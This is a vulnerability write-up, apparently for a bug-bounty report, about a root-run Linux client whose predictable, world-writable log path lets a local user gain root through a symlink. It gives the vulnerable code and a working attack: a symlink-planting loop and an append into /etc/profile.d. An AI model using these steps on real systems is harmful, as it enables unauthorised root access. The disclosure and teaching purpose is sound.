---
title:       "Local root escalation via symlink: the log a privileged process leaves in your folder"
summary:     "A service running as root wrote its log into the directory of the user who launched it, with a predictable name, and gave it write permissions for everyone. That is all it takes to create any system file and have root execute it."
date:        2026-11-05 16:45:00 +0100
lang:        en
ref:         escalada-symlink-log-root
image:       /assets/img/og/escalada-symlink-log-root-en.png
permalink:   /en/writeups/symlink-root-log-privilege-escalation/

severity:    high
cvss:        "7.8"
cvss_vector: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
cwe:         "CWE-59 · CWE-732"
vuln_class:  "Access control"
target_type: "Desktop client (Linux)"
platform:    "YesWeHack"
status:      "Reported"
tags:        [privilege-escalation, linux, symlink, toctou, root, permissions]

takeaways:
  - "If a root process writes inside a folder an ordinary user controls, that user decides which file gets written."
  - "`touch` and `chmod` **follow** symlinks. The kernel protection only covers `/tmp`-style directories, not your home."
  - "\"I can run one specific command as root\" and \"I am root\" are different things. Turning the first into the second is privilege escalation."
  - "You do not need to win a race if the filename is predictable: you plant the link and wait."
---

No injection, no network, no cryptography. Just a program that writes its log file in the
wrong place.

The starting point is a **correct** `sudo` rule, the kind that gets recommended: instead of
granting full privileges, you grant permission for one specific thing.

```
user ALL=(root) NOPASSWD: /usr/bin/client
```

The boundary it draws is clear: *you may run that program as root*, not *you are root*. The
whole bug consists of erasing that boundary. And it is worth saying, because it is the
objection I expected from triage: they could run **one** program; now they can run any.

## The three lines

```python
LOG_DIR = '/home/' + (os.getenv('SUDO_USER') or os.getenv('USER')) + '/.client/logs'

log_file = LOG_DIR + '/log-' + str(int(time.time())) + '.log'
run('touch ' + log_file + '; chmod 666 ' + log_file)

def run(command):
    subprocess.Popen(command, shell=True)
```

Three things, all in plain sight:

1. **The process is root but writes into the user's folder.** It uses `SUDO_USER` on
   purpose, so you can read your own logs. The intent is good; the effect is that an
   all-powerful process is writing into territory you control.
2. **The name is predictable**: the time in seconds, nothing random.
3. **It sets `chmod 666`**: world-writable.

## The symlink

A symlink holds no data, it holds an address. What matters is who follows it: `touch` and
`chmod` do. Put one where you are about to write, and if you are root, you write wherever I
say.

<figure>
  <img src="{{ '/assets/img/writeups/escalada-symlink/01-enlace-simbolico-en.svg' | relative_url }}"
       alt="Diagram: the user plants a symlink at the predictable log path and the root process, writing there, ends up creating a system file writable by everyone">
  <figcaption>The root process writes to a path you control. You decide where it points.</figcaption>
</figure>

<div class="note" markdown="1">
**What about the kernel's protection?** `protected_symlinks` only acts in shared,
*sticky*-bit directories of the `/tmp` sort. A user's home folder is not one of those. I
checked it with both kernel options enabled, which is the default on any modern
distribution.
</div>

## The attack

The attacker is an unprivileged local account with only the `sudo` rule above.

```bash
# 1 · one symlink per second at the predictable path
while true; do
    ln -sf /etc/profile.d/x.sh "$HOME/.client/logs/log-$(date +%s).log"
    sleep 1
done
```

```
# 2 · wait. Not a race: the window is minutes.

# 3 · the legitimate user connects. Root runs:
#     touch <path>; chmod 666 <path>
#     ...follows the link and creates /etc/profile.d/x.sh owned by root, mode 666
```

```bash
# 4 · write into that file, now root-owned but writable by anyone
echo 'id > /tmp/CANARY' >> /etc/profile.d/x.sh
```

Scripts in `/etc/profile.d/` run every time anyone opens a session, root included. And there
is no race to win: since the name depends only on the time in seconds, I plant one symlink
per second and wait.

Quite apart from the attack: **every log that program writes ends up readable and writable
by every user on the machine**. That alone is a problem on any shared box.

## Where I stopped

I did not point the symlink at `/etc/shadow`, nor `/etc/sudoers.d/`, nor
`/etc/ld.so.preload`. It pointed at a canary named after me, which I deleted as soon as it
was proven. My own virtual machine, my own accounts, client uninstalled afterwards. To show I
can create any file as root, creating a harmless one is enough.

## Impact

<div class="impact" markdown="1">
**Impact.** Any unprivileged local user, on a machine where that `sudo` rule exists, gets
**root execution**: reading `/etc/shadow`, persistence, modifying system binaries and
access to every other user's files. The natural setting for this client is shared machines
— workstations, jump hosts, lab boxes — which is exactly where granting a narrow permission
instead of full root is the **correct** practice. The bug punishes precisely the people who
did their job properly.
</div>
